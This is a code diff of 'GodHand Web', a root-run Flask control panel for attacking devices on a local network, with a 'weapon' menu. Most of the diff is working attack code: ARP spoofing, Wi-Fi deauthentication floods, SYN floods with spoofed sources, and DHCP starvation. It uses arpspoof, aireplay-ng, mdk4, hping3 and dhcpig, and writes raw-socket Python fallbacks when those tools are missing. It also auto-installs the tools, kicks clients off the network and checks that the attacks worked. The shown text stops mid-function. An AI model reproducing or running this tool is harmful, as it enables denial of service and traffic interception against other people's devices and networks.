@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 GodHand Web – Production‑ready network control centre
-Baby‑friendly UI, robust attack engine with tool fallbacks.
+Baby‑friendly UI, robust attack engine with tool fallbacks, and action verification.
 Run as root.
 """
 
@@ -33,13 +33,28 @@ STATE = {
     'port': 80,
     'targets': [],
     'hosts': [],
-    'attack_pids': {},      # weapon_id -> list of Popen objects
+    'attack_pids': {},          # weapon_id -> list of Popen objects
+    'attack_status': {},        # weapon_id -> 'running' or 'dead' (updated on poll)
     'blocked_macs': set(),
-    'monitor_log': [],      # latest lines from monitor attack
+    'monitor_log': [],          # latest lines from monitor attack
+    'monitor_log_path': None,
+    'log': [],                  # server-side activity log: list of dicts {time, level, msg}
     'status': 'Ready'
 }
 
 app = Flask(__name__)
+
+# ---------- server-side logging ----------
+def add_log(level, msg):
+    """Append to server log, keep last 200 entries."""
+    entry = {
+        'time': time.strftime('%H:%M:%S'),
+        'level': level,
+        'msg': msg
+    }
+    STATE['log'].append(entry)
+    STATE['log'] = STATE['log'][-200:]
+    print(f"[{level.upper()}] {msg}")
 
 # ---------- tool auto‑installer ----------
 _INSTALLED_TOOLS = set()
@@ -47,54 +62,41 @@ _INSTALL_ATTEMPTED = set()
 
 def detect_package_manager():
     """Return the package manager command and install flag."""
-    # Termux
     if os.path.exists('/data/data/com.termux'):
         return ('pkg', 'install', '-y')
-    # Debian/Ubuntu
     if subprocess.call(['which', 'apt-get'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
         return ('apt-get', 'install', '-y')
-    # Arch
     if subprocess.call(['which', 'pacman'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
         return ('pacman', '-S', '--noconfirm')
-    # Fedora/RHEL
     if subprocess.call(['which', 'dnf'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
         return ('dnf', 'install', '-y')
-    # macOS (Homebrew)
     if subprocess.call(['which', 'brew'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
         return ('brew', 'install')
     return None
 
-def install_package(pkg_name, fallback=True):
-    """Attempt to install a package using the system package manager."""
+def install_package(pkg_name):
     if pkg_name in _INSTALL_ATTEMPTED:
         return pkg_name in _INSTALLED_TOOLS
     _INSTALL_ATTEMPTED.add(pkg_name)
-
     pm = detect_package_manager()
     if pm is None:
-        print(f"⚠️  No package manager found; cannot install {pkg_name} automatically.")
+        add_log('error', f'No package manager found; cannot install {pkg_name}')
         return False
-
     cmd = list(pm) + [pkg_name]
     try:
-        print(f"🔧 Installing {pkg_name} via {' '.join(cmd)} ...")
+        add_log('info', f'Installing {pkg_name} ...')
         subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         _INSTALLED_TOOLS.add(pkg_name)
         return True
     except:
-        print(f"❌ Failed to install {pkg_name} automatically.")
+        add_log('error', f'Failed to install {pkg_name}')
         return False
 
 def ensure_tool(tool_name, package_name=None):
-    """
-    Check if a tool exists; if not, try to install it.
-    Returns True if tool is available after attempt.
-    """
     if tool_exists(tool_name):
         return True
     if package_name is None:
         package_name = tool_name
-    # Map common names to package names
     pkg_map = {
         'arpspoof': 'dsniff',
         'aireplay-ng': 'aircrack-ng',
@@ -106,11 +108,12 @@ def ensure_tool(tool_name, package_name=None):
     }
     pkg = pkg_map.get(package_name, package_name)
     installed = install_package(pkg)
-    if installed and tool_exists(tool_name):
-        return True
-    return False
+    return installed and tool_exists(tool_name)
 
-# ---------- helper functions ----------
+def tool_exists(name):
+    return subprocess.call(['which', name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0
+
+# ---------- network helpers ----------
 def get_my_ip_and_cidr(iface):
     try:
         out = subprocess.check_output(['ip', '-o', '-4', 'addr', 'show', iface], text=True)
@@ -173,19 +176,66 @@ def arp_scan(iface, my_ip, cidr):
     sock.close()
     return results
 
-def tool_exists(name):
-    return subprocess.call(['which', name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0
+def get_gateway_mac(iface, gateway_ip):
+    """Try to get gateway MAC via ARP scan or system cache."""
+    # Try ip neigh
+    try:
+        out = subprocess.check_output(['ip', 'neigh', 'show', gateway_ip], text=True)
+        m = re.search(r'(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})', out)
+        if m:
+            return m.group(1)
+    except:
+        pass
+    # Fallback: ARP scan a few times
+    my_ip, cidr = get_my_ip_and_cidr(iface)
+    hosts = arp_scan(iface, my_ip, cidr)
+    for h in hosts:
+        if h['ip'] == gateway_ip:
+            return h['mac']
+    return None
 
-def set_monitor(iface, enable=True):
+def server_ping(ip, timeout=1):
+    """Ping an IP and return True if reachable."""
+    try:
+        subprocess.check_output(['ping', '-c', '1', '-W', str(timeout), ip],
+                                stderr=subprocess.DEVNULL, timeout=timeout+1)
+        return True
+    except:
+        return False
+
+def server_tcp_connect(ip, port, timeout=1):
+    """Try TCP connect to a port."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        result = s.connect_ex((ip, port))
+        s.close()
+        return result == 0
+    except:
+        return False
+
+# ---------- monitor mode helper (with error checking) ----------
+def set_monitor(iface, enable=True, raise_on_fail=False):
     mode = 'monitor' if enable else 'managed'
-    subprocess.run(['iw', 'dev', iface, 'set', 'type', mode], stderr=subprocess.DEVNULL)
-    if enable:
-        time.sleep(0.5)
-        out = subprocess.check_output(['iw', 'dev', iface, 'info'], text=True)
-        if 'type monitor' not in out:
-            raise RuntimeError(f'Failed to set monitor mode on {iface}')
+    try:
+        subprocess.run(['iw', 'dev', iface, 'set', 'type', mode],
+                       check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+        if enable:
+            time.sleep(0.5)
+            out = subprocess.check_output(['iw', 'dev', iface, 'info'], text=True)
+            if 'type monitor' not in out:
+                raise RuntimeError(f'Failed to set monitor mode on {iface}')
+        return True
+    except subprocess.CalledProcessError as e:
+        if raise_on_fail:
+            raise RuntimeError(f'Monitor mode change failed: {e.stderr.decode()}')
+        return False
+    except Exception as e:
+        if raise_on_fail:
+            raise
+        return False
 
-# ---------- checksum helpers for raw packets ----------
+# ---------- checksum helpers ----------
 def ip_checksum(data):
     if len(data) % 2 == 1:
         data += b'\x00'
@@ -214,21 +264,30 @@ def udp_checksum(ip_src, ip_dst, udp_segment):
     s += s >> 16
     return ~s & 0xffff
 
-# ---------- attack launchers ----------
+# ---------- attack launchers (each returns list of Popen or raises) ----------
 def start_attack_arp_freeze(targets, gateway, iface):
+    add_log('info', f'Starting ARP Freeze on {iface} for {len(targets)} targets')
     pids = []
     if ensure_tool('arpspoof', 'dsniff'):
         for t in targets:
             cmd = ['arpspoof', '-i', iface, '-t', t, gateway]
-            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+            # Give it a moment to start
+            time.sleep(0.1)
+            if proc.poll() is not None:
+                raise RuntimeError(f'arpspoof failed for target {t}')
             pids.append(proc)
         for t in targets:
             cmd = ['arpspoof', '-i', iface, '-t', gateway, t]
-            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+            time.sleep(0.1)
+            if proc.poll() is not None:
+                raise RuntimeError(f'arpspoof failed for gateway {gateway}')
             pids.append(proc)
         return pids
     else:
-        # Python fallback
+        # Python fallback – uses a valid fake MAC (our own MAC) to increase success
+        fake_mac = get_mac(iface).replace(':', '')
         fd, path = tempfile.mkstemp(suffix='.py')
         os.close(fd)
         with open(path, 'w') as f:
@@ -237,7 +296,7 @@ import socket, struct, time
 IFACE = '{iface}'
 GATEWAY = '{gateway}'
 TARGETS = {targets}
-FAKE = b'\\x00\\x00\\x00\\x00\\x00\\x01'
+FAKE = bytes.fromhex('{fake_mac}')
 def send_arp(op, src_ip, dst_ip, src_mac, dst_mac):
     try:
         eth = dst_mac + src_mac + struct.pack('!H', 0x0806)
@@ -248,34 +307,66 @@ def send_arp(op, src_ip, dst_ip, src_mac, dst_mac):
         s.bind((IFACE, 0))
         s.send(eth + arp)
         s.close()
-    except: pass
+    except Exception as e:
+        print(e, file=sys.stderr)
 while True:
     for t in TARGETS:
         send_arp(2, GATEWAY, t, FAKE, b'\\xff'*6)
         send_arp(2, t, GATEWAY, FAKE, b'\\xff'*6)
     time.sleep(0.5)
 """)
-        proc = subprocess.Popen(['python3', path])
+        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
+        time.sleep(0.5)
+        if proc.poll() is not None:
+            raise RuntimeError('ARP fallback script exited immediately')
         threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
         pids.append(proc)
         return pids
 
 def start_attack_deauth(targets, iface):
+    add_log('info', f'Starting Deauth Flood on {iface} for {len(targets)} targets')
+    # We need monitor mode
+    if not set_monitor(iface, True, raise_on_fail=True):
+        raise RuntimeError('Failed to enable monitor mode')
     pids = []
-    try:
-        set_monitor(iface, True)
-    except:
-        pass
-    if ensure_tool('mdk4'):
+    gateway_mac = get_gateway_mac(iface, STATE['gateway']) if STATE['gateway'] else None
+
+    if ensure_tool('aireplay-ng', 'aircrack-ng'):
+        # Use aireplay-ng per target if possible
+        if targets and gateway_mac:
+            for t_ip in targets:
+                # We need target MAC – try to find in hosts
+                t_mac = None
+                for h in STATE['hosts']:
+                    if h['ip'] == t_ip:
+                        t_mac = h['mac']
+                        break
+                if t_mac:
+                    cmd = ['aireplay-ng', '-0', '0', '-a', gateway_mac, '-c', t_mac, iface]
+                    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+                    time.sleep(0.1)
+                    if proc.poll() is not None:
+                        continue
+                    pids.append(proc)
+        if not pids:
+            # Fallback to broadcast deauth
+            cmd = ['aireplay-ng', '-0', '0', '-a', 'FF:FF:FF:FF:FF:FF', iface]
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+            time.sleep(0.1)
+            if proc.poll() is not None:
+                raise RuntimeError('aireplay-ng broadcast deauth failed')
+            pids.append(proc)
+        return pids
+    elif ensure_tool('mdk4'):
         cmd = ['mdk4', iface, 'd', '-c', '100']
-        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+        time.sleep(0.1)
+        if proc.poll() is not None:
+            raise RuntimeError('mdk4 deauth failed')
         pids.append(proc)
-    elif ensure_tool('aireplay-ng', 'aircrack-ng'):
-        cmd = ['aireplay-ng', '-0', '0', '-a', 'FF:FF:FF:FF:FF:FF', iface]
-        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        pids.append(proc)
+        return pids
     else:
-        # Python fallback with correct 802.11 frame
+        # Python fallback – basic broadcast deauth
         fd, path = tempfile.mkstemp(suffix='.py')
         os.close(fd)
         with open(path, 'w') as f:
@@ -299,25 +390,34 @@ while True:
     seq = (seq + 1) & 0xfff
     time.sleep(0.1)
 """)
-        proc = subprocess.Popen(['python3', path])
+        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
+        time.sleep(0.5)
+        if proc.poll() is not None:
+            raise RuntimeError('Deauth fallback script exited immediately')
         threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
         pids.append(proc)
-    return pids
+        return pids
 
 def start_attack_syn_flood(targets, port, iface):
+    add_log('info', f'Starting SYN Flood on {iface}:{port} for {len(targets)} targets')
     pids = []
     if ensure_tool('hping3'):
         for t in targets:
             cmd = ['hping3', '-S', '-p', str(port), '--flood', '--rand-source', t]
-            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+            time.sleep(0.1)
+            if proc.poll() is not None:
+                continue
             pids.append(proc)
+        if not pids:
+            raise RuntimeError('No hping3 processes started')
         return pids
     else:
         fd, path = tempfile.mkstemp(suffix='.py')
         os.close(fd)
         with open(path, 'w') as f:
             f.write(f"""
-import socket, struct, random, time
+import socket, struct, random, time, sys
 TARGETS = {targets}
 PORT = {port}
 def tcp_checksum(ip_src, ip_dst, tcp_segment):
@@ -329,7 +429,6 @@ def tcp_checksum(ip_src, ip_dst, tcp_segment):
     s = (s >> 16) + (s & 0xffff)
     s += s >> 16
     return ~s & 0xffff
-
 s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
 while True:
@@ -342,19 +441,27 @@ while True:
             tcp = tcp[:16] + struct.pack('!H', tcp_checksum(src_ip, t, tcp)) + tcp[18:]
             pkt = iph + tcp
             s.sendto(pkt, (t,0))
-        except: pass
+        except Exception as e:
+            pass
     time.sleep(0.01)
 """)
-        proc = subprocess.Popen(['python3', path])
+        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
+        time.sleep(0.5)
+        if proc.poll() is not None:
+            raise RuntimeError('SYN flood fallback script exited immediately')
         threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
         pids.append(proc)
         return pids
 
 def start_attack_dhcp_storm(targets, gateway, iface):
+    add_log('info', f'Starting DHCP Storm on {iface} targeting DHCP server {gateway}')
     pids = []
     if ensure_tool('dhcpig'):
         cmd = ['dhcpig', '-i', iface, '-t', gateway, '-s', '1000']
-        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+        time.sleep(0.1)
+        if proc.poll() is not None:
+            raise RuntimeError('dhcpig failed to start')
         pids.append(proc)
         return pids
     else:
@@ -376,7 +483,6 @@ def udp_checksum(ip_src, ip_dst, udp_segment):
     s = (s >> 16) + (s & 0xffff)
     s += s >> 16
     return ~s & 0xffff
-
 s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
 while True:
@@ -401,12 +507,19 @@ while True:
     s.sendto(pkt, (BROADCAST, 67))
     time.sleep(0.2)
 """)
-        proc = subprocess.Popen(['python3', path])
+        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
+        time.sleep(0.5)
+        if proc.poll() is not None:
+            raise RuntimeError('DHCP storm fallback script exited immediately')
         threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
         pids.append(proc)
         return pids
 
 def start_attack_monitor(targets, port, iface):
+    add_log('info', f'Starting Traffic Capture on {iface} for port {port}')
+    # Enable monitor mode for best capture
+    if not set_monitor(iface, True, raise_on_fail=False):
+        add_log('warn', 'Monitor mode could not be enabled; capture may be incomplete')
     fd, path = tempfile.mkstemp(suffix='.py')
     os.close(fd)
     log_path = f"/tmp/godhand_monitor_{int(time.time())}.log"
@@ -440,7 +553,10 @@ while True:
         sys.stdout.flush()
 """)
     log_file = open(log_path, 'w')
-    proc = subprocess.Popen(['python3', path], stdout=log_file, stderr=subprocess.DEVNULL)
+    proc = subprocess.Popen(['python3', path], stdout=log_file, stderr=subprocess.PIPE)
+    time.sleep(0.5)
+    if proc.poll() is not None:
+        raise RuntimeError('Monitor script exited immediately')
     STATE['monitor_log_path'] = log_path
     threading.Thread(target=lambda: (proc.wait(), log_file.close(), os.unlink(path)), daemon=True).start()
     def update_monitor_log():
@@ -461,7 +577,7 @@ while True:
 
 def run_attack(weapon_id, targets, gateway, port, iface):
     if not targets:
-        return None
+        raise ValueError('No targets')
     if weapon_id == 1:
         return start_attack_arp_freeze(targets, gateway, iface)
     elif weapon_id == 2:
@@ -485,17 +601,18 @@ def kill_attack(pids):
             except:
                 pass
 
+# ---------- kick & block (with verification) ----------
 def kick_client(ip, mac, iface):
-    if not mac:
-        return False
-    try:
-        set_monitor(iface, True)
-    except:
-        pass
+    add_log('info', f'Attempting to kick {ip} ({mac})')
+    if not set_monitor(iface, True, raise_on_fail=True):
+        raise RuntimeError('Cannot enable monitor mode')
     if ensure_tool('aireplay-ng', 'aircrack-ng'):
         cmd = ['aireplay-ng', '-0', '5', '-a', 'FF:FF:FF:FF:FF:FF', '-c', mac, iface]
-        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        if res.returncode != 0:
+            raise RuntimeError('aireplay-ng deauth failed: ' + res.stderr.decode())
     else:
+        # Python fallback
         fd, path = tempfile.mkstemp(suffix='.py')
         os.close(fd)
         with open(path, 'w') as f:
@@ -504,7 +621,7 @@ import socket, struct, time
 IFACE = '{iface}'
 MAC = '{mac}'
 dst_mac = bytes.fromhex(MAC.replace(':', ''))
-radiotap = b'\\x00\\x00\\x0e\\x00\\x04\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'
+radiotap = b'\\x00\\x00\\x0e\\x00\\x04\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00'
 def pkt(dst, seq):
     frame_control = b'\\xc0\\x00'
     duration = b'\\x00\\x00'
@@ -521,30 +638,59 @@ for i in range(20):
     time.sleep(0.05)
 sock.close()
 """)
-        subprocess.run(['python3', path])
+        res = subprocess.run(['python3', path], stderr=subprocess.PIPE)
         os.unlink(path)
-    try:
-        set_monitor(iface, False)
-    except:
-        pass
-    return True
+        if res.returncode != 0:
+            raise RuntimeError('Deauth fallback script failed')
+    set_monitor(iface, False)
+    # Verification: after a short delay, ping the target
+    time.sleep(2)
+    reachable = server_ping(ip, timeout=1)
+    if reachable:
+        add_log('warn', f'Target {ip} is still responding to ping after kick')
+        return False  # not fully kicked
+    else:
+        add_log('success', f'Target {ip} is not responding to ping after kick')
+        return True
 
 def block_mac(mac):
     if not mac:
-        return
+        raise ValueError('No MAC')
+    add_log('info', f'Toggling block for MAC {mac}')
     if mac in STATE['blocked_macs']:
-        subprocess.run(['iptables', '-D', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'], stderr=subprocess.DEVNULL)
-        subprocess.run(['iptables', '-D', 'FORWARD', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'], stderr=subprocess.DEVNULL)
+        # Try to remove
+        r1 = subprocess.run(['iptables', '-D', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
+                            stderr=subprocess.PIPE)
+        r2 = subprocess.run(['iptables', '-D', 'FORWARD', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
+                            stderr=subprocess.PIPE)
+        # Verify removal
+        check = subprocess.run(['iptables', '-C', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
+                               stderr=subprocess.PIPE)
+        if check.returncode == 0:
+            # Still exists, removal failed
+            raise RuntimeError('Failed to remove iptables rule')
         STATE['blocked_macs'].discard(mac)
+        add_log('success', f'Unblocked {mac}')
+        return False  # now unblocked
     else:
-        subprocess.run(['iptables', '-I', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'], stderr=subprocess.DEVNULL)
-        subprocess.run(['iptables', '-I', 'FORWARD', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'], stderr=subprocess.DEVNULL)
+        r1 = subprocess.run(['iptables', '-I', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
+                            stderr=subprocess.PIPE)
+        r2 = subprocess.run(['iptables', '-I', 'FORWARD', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
+                            stderr=subprocess.PIPE)
+        # Verify insertion
+        check = subprocess.run(['iptables', '-C', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
+                               stderr=subprocess.PIPE)
+        if check.returncode != 0:
+            # Rule not found
+            raise RuntimeError('Failed to insert iptables rule')
         STATE['blocked_macs'].add(mac)
+        add_log('success', f'Blocked {mac}')
+        return True
 
 # ---------- Flask routes ----------
 @app.route('/')
 def index():
-    # the same HTML template (unchanged)
+    # Updated HTML template with improvements
     html_template = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -596,6 +742,16 @@ def index():
     color: var(--dim);
     font-size: 13px;
   }
+  .banner {
+    background: var(--warn);
+    color: #000;
+    padding: 8px 16px;
+    margin: 0 24px 10px;
+    border-radius: 6px;
+    font-size: 13px;
+    display: none;
+  }
+  .banner a { color: #000; font-weight: bold; }
   nav {
     display: flex;
     flex-wrap: wrap;
@@ -844,6 +1000,11 @@ def index():
     animation: spin 0.8s linear infinite;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
+  .target-badge {
+    font-size: 11px;
+    color: var(--accent);
+    margin-left: 6px;
+  }
 </style>
 </head>
 <body>
@@ -852,12 +1013,16 @@ def index():
   <p>All‑in‑one network control centre: monitor, attack, kick, block.</p>
 </header>
 
+<div class="banner" id="prereq-banner">
+  ⚠️ <span id="prereq-msg"></span> <a href="#" onclick="switchTab('settings')">Go to Settings</a>
+</div>
+
 <nav id="main-nav">
   <button class="tab-btn active" data-tab="attacks">🎯 Attacks</button>
   <button class="tab-btn" data-tab="targets">📋 Targets</button>
   <button class="tab-btn" data-tab="hosts">📡 Hosts</button>
   <button class="tab-btn" data-tab="settings">⚙️ Settings</button>
-  <button class="tab-btn" data-tab="monitor">📊 Monitor</button>
+  <button class="tab-btn" data-tab="devicewatch">📊 Device Watch</button>
   <button class="tab-btn" data-tab="detector">🛡️ Detector</button>
   <button class="tab-btn" data-tab="logs">📜 Logs</button>
 </nav>
@@ -873,11 +1038,11 @@ def index():
         <div class="weapon-btn" data-w="2"><span class="num">2</span>Deauth Flood</div>
         <div class="weapon-btn" data-w="3"><span class="num">3</span>SYN Flood</div>
         <div class="weapon-btn" data-w="4"><span class="num">4</span>DHCP Storm</div>
-        <div class="weapon-btn" data-w="5"><span class="num">5</span>Monitor</div>
+        <div class="weapon-btn" data-w="5"><span class="num">5</span>Traffic Capture</div>
       </div>
       <div class="btn-group">
-        <button class="btn big" id="start-btn" onclick="startAttack()">▶ Start</button>
-        <button class="btn big secondary" onclick="stopAttack()">⏹ Stop</button>
+        <button class="btn big" id="start-btn" onclick="confirmStartAttack()">▶ Start</button>
+        <button class="btn big secondary" onclick="confirmStopAttack()">⏹ Stop</button>
       </div>
       <div id="attack-status" class="status-msg">Status: Ready</div>
     </div>
@@ -912,13 +1077,14 @@ def index():
   <div class="tab" id="tab-hosts">
     <div class="panel">
       <h2>Discovered hosts</h2>
-      <p class="sub">Scan the LAN to populate this list. Click an IP to add it as a target.</p>
+      <p class="sub">Scan the LAN to populate this list. Check boxes to bulk add to targets.</p>
       <div class="row">
         <button class="btn" id="scan-btn" onclick="refreshHosts()">🔄 Scan now</button>
+        <button class="btn secondary" onclick="bulkAddTargets()">Add selected to targets</button>
         <span id="scan-spinner" style="display:none;"><span class="spinner"></span> Scanning...</span>
       </div>
       <table id="host-table">
-        <thead><tr><th>IP</th><th>MAC</th><th>Reachability</th><th>Action</th></tr></thead>
+        <thead><tr><th><input type="checkbox" id="select-all-hosts" onchange="toggleAllHosts()"></th><th>IP</th><th>MAC</th><th>Reachability</th><th>Action</th></tr></thead>
         <tbody id="host-body"></tbody>
       </table>
       <div class="empty" id="host-empty">No hosts discovered. Press "Scan now".</div>
@@ -946,11 +1112,11 @@ def index():
     </div>
   </div>
 
-  <!-- MONITOR TAB (original passive monitoring) -->
-  <div class="tab" id="tab-monitor">
+  <!-- DEVICE WATCH TAB (renamed from Monitor) -->
+  <div class="tab" id="tab-devicewatch">
     <div class="panel">
       <h2>Add a device</h2>
-      <p class="sub">Track hosts on your own LAN. Reachability uses best-effort browser timing against common ports (80/443) — it can't confirm a host is fully down, only whether it responded.</p>
+      <p class="sub">Track hosts on your own LAN. Server-side ping is used for reachability.</p>
       <div class="row">
         <input type="text" id="dev-name" placeholder="Label (e.g. Living Room TV)">
         <input type="text" id="dev-ip" placeholder="IP address (e.g. 192.168.1.20)">
@@ -960,9 +1126,9 @@ def index():
     <div class="panel">
       <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
         <h2 style="margin:0;">Tracked devices</h2>
-        <button class="btn secondary" onclick="checkAll()">Check all</button>
+        <button class="btn secondary" onclick="checkAllDevices()">Check all</button>
       </div>
-      <p class="sub">Tap "Check" to ping via HTTP timing. Times out after 2.5s.</p>
+      <p class="sub">Uses server-side ping (ICMP) for reliable reachability.</p>
       <table id="dev-table">
         <thead><tr><th>Label</th><th>IP</th><th>Status</th><th>Latency</th><th></th></tr></thead>
         <tbody></tbody>
@@ -971,7 +1137,7 @@ def index():
     </div>
   </div>
 
-  <!-- DETECTOR TAB (original ARP/deauth detection) -->
+  <!-- DETECTOR TAB (unchanged mostly, but can be enhanced later) -->
   <div class="tab" id="tab-detector">
     <div class="panel">
       <h2>Paste an ARP snapshot</h2>
@@ -1009,9 +1175,9 @@ def index():
   <!-- LOGS TAB -->
   <div class="tab" id="tab-logs">
     <div class="panel">
-      <h2>Activity log</h2>
-      <p class="sub">All actions and errors are recorded here with timestamps.</p>
-      <button class="btn secondary" onclick="clearLogs()">Clear log</button>
+      <h2>Activity log (server-side)</h2>
+      <p class="sub">All actions are logged on the server and synced to this view.</p>
+      <button class="btn secondary" onclick="clearServerLogs()">Clear server log</button>
       <div class="log-container" id="log-container"></div>
     </div>
   </div>
@@ -1022,9 +1188,12 @@ def index():
 let selectedWeapon = 1;
 let currentTargets = [];
 let currentHosts = [];
-let blockedMacs = new Set();
-let logEntries = [];
-let attackRunning = false;
+let attackRunning = {};   // weapon_id -> true/false based on server
+let logPollTimer = null;
+let attackPollTimer = null;
+let devices = JSON.parse(localStorage.getItem('lg_devices') || '[]');
+let arpHistory = JSON.parse(localStorage.getItem('lg_arp_history') || '[]');
+let alerts = JSON.parse(localStorage.getItem('lg_alerts') || '[]');
 
 // ---------- UI helpers ----------
 function escapeHtml(s) {
@@ -1037,40 +1206,18 @@ function showStatus(msg, good=true) {
     el.textContent = 'Status: ' + msg;
     el.style.borderLeftColor = good ? 'var(--good)' : 'var(--bad)';
   }
-  addLog(msg, good ? 'success' : 'error');
 }
 
-function addLog(msg, level='info') {
-  const time = new Date().toLocaleTimeString();
-  logEntries.push({ time, msg, level });
-  renderLogs();
-}
-
-function renderLogs() {
-  const container = document.getElementById('log-container');
-  container.innerHTML = '';
-  logEntries.slice(-50).forEach(entry => {
-    const div = document.createElement('div');
-    div.className = 'log-entry ' + entry.level;
-    div.innerHTML = `<span class="time">[${entry.time}]</span><span class="msg">${escapeHtml(entry.msg)}</span>`;
-    container.appendChild(div);
-  });
-  container.scrollTop = container.scrollHeight;
-}
-
-function clearLogs() {
-  logEntries = [];
-  renderLogs();
+function switchTab(tabId) {
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelector(`.tab-btn[data-tab="${tabId}"]`).classList.add('active');
+  document.getElementById('tab-' + tabId).classList.add('active');
 }
 
 // ---------- tabs ----------
 document.querySelectorAll('.tab-btn').forEach(btn => {
-  btn.addEventListener('click', () => {
-    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-    btn.classList.add('active');
-    document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
-  });
+  btn.addEventListener('click', () => switchTab(btn.dataset.tab));
 });
 
 // ---------- weapon selection ----------
@@ -1079,7 +1226,6 @@ document.querySelectorAll('.weapon-btn').forEach(el => {
     document.querySelectorAll('.weapon-btn').forEach(b => b.classList.remove('active'));
     el.classList.add('active');
     selectedWeapon = parseInt(el.dataset.w, 10);
-    addLog(`Weapon selected: ${el.textContent.trim()}`, 'info');
   });
 });
 
@@ -1091,7 +1237,69 @@ async function apiCall(endpoint, method='GET', data=null) {
   return res.json();
 }
 
-// ---------- interface selection ----------
+// ---------- Polling server logs ----------
+async function pollLogs() {
+  const data = await apiCall('logs');
+  if (data.logs) {
+    renderLogs(data.logs);
+  }
+}
+function renderLogs(logs) {
+  const container = document.getElementById('log-container');
+  container.innerHTML = '';
+  logs.slice(-100).forEach(entry => {
+    const div = document.createElement('div');
+    div.className = 'log-entry ' + entry.level;
+    div.innerHTML = `<span class="time">[${entry.time}]</span><span class="msg">${escapeHtml(entry.msg)}</span>`;
+    container.appendChild(div);
+  });
+  container.scrollTop = container.scrollHeight;
+}
+function clearServerLogs() {
+  apiCall('clear_logs', 'POST').then(() => pollLogs());
+}
+
+// ---------- Polling attack status ----------
+async function pollAttackStatus() {
+  const data = await apiCall('attack_status');
+  attackRunning = data.attacks;  // e.g. {1: true, 2: false}
+  updateAttackButtons();
+}
+function updateAttackButtons() {
+  const anyRunning = Object.values(attackRunning).some(v => v);
+  document.getElementById('start-btn').disabled = anyRunning;
+  document.getElementById('stop-btn').disabled = !anyRunning;
+  // Update status text
+  if (anyRunning) {
+    const runningWeapons = Object.keys(attackRunning).filter(k => attackRunning[k]);
+    showStatus('Running: ' + runningWeapons.join(', '), true);
+  } else {
+    showStatus('Ready', true);
+  }
+}
+
+// ---------- Prerequisites check ----------
+async function checkPrerequisites() {
+  const state = await apiCall('state');
+  const s = state.state;
+  let missing = [];
+  if (!s.interface) missing.push('interface not set');
+  if (!s.gateway) missing.push('gateway not set');
+  if (s.targets.length === 0) missing.push('no targets added');
